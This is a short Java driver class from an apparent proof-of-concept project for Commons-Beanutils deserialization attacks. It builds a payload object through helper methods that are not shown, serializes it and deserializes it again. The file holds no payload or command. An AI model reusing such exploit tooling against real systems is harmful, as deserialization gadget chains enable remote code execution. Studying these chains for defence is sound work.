package POC_macker.CommonsBeanutils;


import static POC_macker.CommonsBeanutils.CommomsBeanutils.*;


public class Get_poc {
    public static void main(String[] args) throws Exception {
        serialize(
                getPayloadObject()
        );
        unserialize();
        System.out.println("End");
    }


}
